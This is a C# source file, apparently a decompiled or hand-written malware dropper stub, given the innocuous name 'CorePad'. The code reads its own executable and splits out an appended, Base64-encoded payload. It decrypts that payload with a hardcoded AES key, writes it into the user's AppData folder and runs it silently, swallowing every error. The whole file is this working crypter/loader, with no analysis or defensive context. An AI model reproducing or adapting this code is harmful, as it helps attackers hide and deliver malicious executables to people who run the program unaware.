using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace CorePad;

internal class CorePad
{
	private static string Text;

	private static string appDat;

	private static string[] spl = new string[1] { "[L1OSilclouQwtm7CyMu4Dgo2rDAbq86BhbhmMFrTbs]" };

	private static string[] fName;

	private static byte[] fContentus;

	private static void Main(string[] args)
	{
		try
		{
			Text = SyFiRe();
			appDat = Folder();
			fName = TeSplit();
			fContentus = Fraps(Convert.FromBase64String(fName[1]));
			SyFi();
			SysDiProStart();
		}
		catch
		{
		}
	}

	private static bool SysDiProStart()
	{
		try
		{
			Process.Start(appDat + "\\" + fName[2]);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static bool SyFi()
	{
		try
		{
			File.WriteAllBytes(appDat + "\\" + fName[2], fContentus);
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static string[] TeSplit()
	{
		try
		{
			return Text.Split(spl, StringSplitOptions.None);
		}
		catch
		{
			return new string[2] { "x", "y" };
		}
	}

	private static byte[] Fraps(byte[] RdlKey)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] iV = new byte[16]
			{
				1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
				2, 3, 4, 5, 6, 7
			};
			byte[] key = new byte[16]
			{
				7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
				6, 5, 4, 3, 2, 1
			};
			rijndaelManaged.IV = iV;
			rijndaelManaged.Key = key;
			return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RdlKey, 0, RdlKey.Length);
		}
		catch
		{
			return null;
		}
	}

	private static string SyFiRe()
	{
		try
		{
			return File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch
		{
			return "";
		}
	}

	private static string Folder()
	{
		try
		{
			return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}
		catch
		{
			return "";
		}
	}

	private static string nullDom()
	{
		return "XY";
	}
}
